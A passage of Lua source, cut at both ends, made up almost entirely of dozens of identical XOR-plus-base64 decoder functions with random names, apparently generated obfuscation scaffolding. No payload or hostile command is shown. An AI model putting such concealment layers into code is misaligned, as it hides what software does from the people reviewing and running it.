    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ygzquw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wsgngs(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ekcqnh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_l_mdun(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_mac_cy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yyyhmi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ulvucn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tasjpq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yxxyvi(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qoqzlh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_mpobov(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wpthab(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cwnwxm(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xrjhvh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_tomahc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dmloxw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_eyggmo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vvukoa(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cvhkde(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_oqhpxu(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bcjlkh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yjjasd(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zudgxe(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_cplsbz(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_opofrk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_jlrhru(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wnxylf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_p_auxn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uczunk(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ztvgwo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_awloyo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__ieery(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kvbgjq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_xpgbwe(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wqixpw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bd_mxq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_euqkp_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
